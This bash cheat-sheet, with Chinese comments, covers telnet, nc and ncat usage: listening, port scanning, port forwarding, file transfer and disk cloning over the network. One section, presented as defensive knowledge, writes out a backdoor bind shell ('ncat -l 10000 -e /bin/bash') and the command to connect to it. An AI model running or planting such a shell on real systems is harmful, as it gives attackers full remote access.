#!/usr/bin/env bash

# compile and install
# https://pkgs.org/download/nc

yum -y install net-tools telnet nc
yum -y install telnet
yum -y install nc

telnet 192.168.1.1 25
# 如果不嫌多一步可以考虑用CTRL+]键，这时会强制退到telnet命令界面下，再用quit退出就行了，百试百灵。
# 其它就是用CTRL +C或CTRL+D两种方式来强行断开与远程的连接，但能支持这种命令的比较少。

## ncat [OPTIONS...] [hostname] [port]
## nc [OPTIONS...] [hostname] [port]
# -4 强制nc只能使用IPv4地址。
# -6 强制nc只能使用IPv6地址。
# -D 在socket上进行调试以排除故障。
# -d 不尝试从标准输入读取。
# -h 打印nc帮助信息。
# -i 间隔。在发送和接收之间指定一个间隔时间。同时会引起连接多个接口时的延迟。
# -k 当nc当前的连接完成时，强制nc监听其它的连接。必须同时使用- l选项。
# -l 指定nc监听一个外来的连接，而不是向远程主机发起一个连接。不能同时使用 -p , -s, -z, -w选项。
# -n 不在任何指定的地址、主机、端口查看DNS或者服务。
# -p 源端口。指定nc应该使用的源端口，受到特权的限制和可用性。不能同时使用-l选项。
# -r 指定源或目标端口使用随机的端口而不是一个范围序列或系统分配的顺序。
# -S 使RFC 2385 TCP 的MD5签名可用。
# -s 源IP地址。指定发送包的接口的IP。不能同时使用-l选项。
# -T 服务类型。为连接指定IP报头的服务类型。有效值为”lowdelay”,”throughput”,”reliability”或者是8位的16进制值（16进制前缀0x)。
# -C 发送CRLF作为一行的结束。
# -t 引发nc发送RFC 854 DON’The WON’T响应给RFC 854 DO和WILL请求。这使得使用nc脚本化telnet会话成为可能。
# -U 指定使用Unix Sockets 服务。
# -u 使用UDP代替默认的TCP。
# -v nc给出更详细的输出。
# -w 超时时间。如果连接或输入停顿时间超过超时时间就关闭连接。-w选项不会影响到-l选项，也即，nc将会永久的监听一个连接，不管有没有-w选项。
#     默认没有超时时间。
# -X 代理版本。当与代理服务器会话是要求nc使用指定的代理协议。支持的协议有”4”(SOCKS v.4),”5”(SOCKS v.5),
#     ”connect”(HTTPS proxy).默认使用SOCKS v.5。
# -x 代理地址[:端口]。要求nc使用一个有代理地址和端口的代理来连接主机名。如果没有指定，则使用熟知端口（SOCKS-1080,HTTPS-3128)。
# -z 指定nc只扫描正在监听的守护进程，不发送任何数据。
#     主机名可以是数字形式的IP或者是名字标志（除非使用了-h选项）。通常，主机名必须被指定，除非使用-l选项（这种情况下，本地主机正在使用）。
#     端口可以是整数或一个范围（格式nn-mm）。通常，必须指定目标端口，除非使用-U选项（这种情况下，必须指定一个socket)。


### 监听本地端口
nc -l -p 80   # 开启本机 80 端口 TCP 监听
nc -k -lp 80   # 开启本机 80 端口 TCP 监听，Accept multiple connections in listen mode
nc -l 5555    # macos
nc -lk 5555    # -k 我们可以强制服务器保持连接并继续监听端口
nc -l -p 80 > /tmp/log

## 作为客户端连接
ncat 192.168.0.102 8080

## 扫描端口
nc -zv host.example.com 22           # 扫描 22 端口是否开放
nc -zv host.example.com 22 80 443    # 扫描端口
nc -zv host.example.com 20-30        # 扫描一个范围
nc -zv -w 5 host.example.com 22-443  # -w 表示超时等待 5 秒
nc -zv 127.0.0.1 15625

## 作为简单的 Web Server
nc -l 8080 < index.html
curl localhost:8080

## ping
until ping -c1 google.com; do sleep 1; done;
until [$(nc -zv 13.112.200.162 7000) == "*succeeded*"]; do sleep 1; done;
until $(nc -zv 127.0.0.1 3306) == "*succeeded*"; do sleep 1; done;

until nc -z 127.0.0.1 3306; do sleep 1; done;
until nc -z 127.0.0.1 1234; do sleep 1; done;

## 代理，端口转发
nc -l 8000                      # 在 192.168.0.102 上开端口 8000
nc -l 9000 | nc localhost 8000  # 在 192.168.0.102 上开端口转发，从 9000 转发到 8000
nc 192.168.0.102 9000           # 连接 192.168.0.102 上端口 9000

## 端口扫描
nc -v -z -w2 192.168.0.3 1-100  # TCP端口扫描
nc -u -z -w2 192.168.0.1 1-1000 # UDP扫描192.168.0.3 的端口 范围是 1-1000
nc -nvv 192.168.0.1 80          # 扫描 80端口

## 远程拷贝文件
nc -l 1234 > 1234.txt
nc -w 1 192.168.200.27 1234 < abc.txt

## 克隆硬盘或分区的操作，不应在已经mount的的系统上进行。
nc -l -p 1234 | dd of=/dev/sda          # server2上进行类似的监听动作：
dd if=/dev/sda | nc 192.168.200.27 1234 # server1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：

## nc 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。
# 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：
ncat -l 10000 -e /bin/bash

## -e 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：
ncat 192.168.1.100 10000

# Options taking a time assume seconds. Append 'ms' for milliseconds,
# 's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
  -4                         # Use IPv4 only
  -6                         # Use IPv6 only
  -U, --unixsock             # Use Unix domain sockets only
  -C, --crlf                 # Use CRLF for EOL sequence
  -c, --sh-exec <command>    # Executes the given command via /bin/sh
  -e, --exec <command>       # Executes the given command
      --lua-exec <filename>  # Executes the given Lua script
  -g hop1[,hop2,...]         # Loose source routing hop points (8 max)
  -G <n>                     # Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns <n>        # Maximum <n> simultaneous connections
  -h, --help                 # Display this help screen
  -d, --delay <time>         # Wait between read/writes
  -o, --output <filename>    # Dump session data to a file
  -x, --hex-dump <filename>  # Dump session data as hex to a file
  -i, --idle-timeout <time>  # Idle read/write timeout
  -p, --source-port port     # Specify source port to use
  -s, --source addr          # Specify source address to use (doesn't affect -l)
  -l, --listen               # Bind and listen for incoming connections
  -k, --keep-open            # Accept multiple connections in listen mode
  -n, --nodns                # Do not resolve hostnames via DNS
  -t, --telnet               # Answer Telnet negotiations
  -u, --udp                  # Use UDP instead of default TCP
      --sctp                 # Use SCTP instead of default TCP
  -v, --verbose              # Set verbosity level (can be used several times)
  -w, --wait <time>          # Connect timeout
  -z                         # Zero-I/O mode, report connection status only
      --append-output        # Append rather than clobber specified output files
      --send-only            # Only send data, ignoring received; quit on EOF
      --recv-only            # Only receive data, never send anything
      --allow                # Allow only given hosts to connect to Ncat
      --allowfile            # A file of hosts allowed to connect to Ncat
      --deny                 # Deny given hosts from connecting to Ncat
      --denyfile             # A file of hosts denied from connecting to Ncat
      --broker               # Enable Ncat's connection brokering mode
      --chat                 # Start a simple Ncat chat server
      --proxy <addr[:port]>  # Specify address of host to proxy through
      --proxy-type <type>    # Specify proxy type ("http" or "socks4" or "socks5")
      --proxy-auth <auth>    # Authenticate with HTTP or SOCKS proxy server
      --ssl                  # Connect or listen with SSL
      --ssl-cert             # Specify SSL certificate file (PEM) for listening
      --ssl-key              # Specify SSL private key (PEM) for listening
      --ssl-verify           # Verify trust and domain name of certificates
      --ssl-trustfile        # PEM file containing trusted SSL certificates
      --ssl-ciphers          # Cipherlist containing SSL ciphers to use
      --version              # Display Ncat's version information and exit

